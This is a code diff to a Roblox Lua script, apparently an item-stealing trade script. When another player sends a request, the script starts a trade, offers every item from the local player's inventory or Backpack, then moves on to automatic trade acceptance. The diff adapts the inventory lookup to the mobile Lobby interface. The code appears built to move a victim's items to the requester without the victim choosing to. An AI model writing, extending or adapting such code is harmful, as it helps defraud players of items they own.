@@ -39,24 +39,32 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             print("Trade started! Waiting 1 second before offering items...")
             task.wait(1)
             
-            local targetPlayerName = LocalPlayer.Name
             local inventoryContainer = nil
-            
             local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+            
             if pGui then
                 local mainGui = pGui:FindFirstChild("MainGUI")
                 if mainGui then
-                    local gameFolder = mainGui:FindFirstChild("Game")
-                    if gameFolder then
-                        local crafting = gameFolder:FindFirstChild("Crafting")
-                        if crafting then
-                            local inventory = crafting:FindFirstChild("Inventory")
+                    local lobby = mainGui:FindFirstChild("Lobby")
+                    if lobby then
+                        local screens = lobby:FindFirstChild("Screens")
+                        if screens then
+                            local inventory = screens:FindFirstChild("Inventory")
                             if inventory then
-                                local salvage = inventory:FindFirstChild("Salvage")
-                                if salvage then
-                                    local scrollFrame = salvage:FindFirstChild("ScrollFrame")
-                                    if scrollFrame then
-                                        inventoryContainer = scrollFrame:FindFirstChild("Container")
+                                local main = inventory:FindFirstChild("Main")
+                                if main then
+                                    local crafting = main:FindFirstChild("Crafting")
+                                    if crafting then
+                                        local craftingMain = crafting:FindFirstChild("Main")
+                                        if craftingMain then
+                                            local salvage = craftingMain:FindFirstChild("Salvage")
+                                            if salvage then
+                                                local scrollFrame = salvage:FindFirstChild("ScrollFrame")
+                                                if scrollFrame then
+                                                    inventoryContainer = scrollFrame:FindFirstChild("Container")
+                                                end
+                                            end
+                                        end
                                     end
                                 end
                             end
@@ -86,7 +94,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
                     end
                 end
-                print("Successfully offered " .. tostring(offeredCount) .. " items for player: " .. targetPlayerName)
+                print("Successfully offered " .. tostring(offeredCount) .. " items from mobile Lobby inventory container!")
             else
                 if LocalPlayer:FindFirstChild("Backpack") then
                     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
@@ -97,7 +105,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
                     end
                 end
-                warn("Inventory container path not found directly; pulled " .. tostring(offeredCount) .. " items from Backpack for " .. targetPlayerName)
+                warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) .. " items from Backpack instead.")
             end
 
             print("Waiting 7 seconds before triggering trade accept actions...")
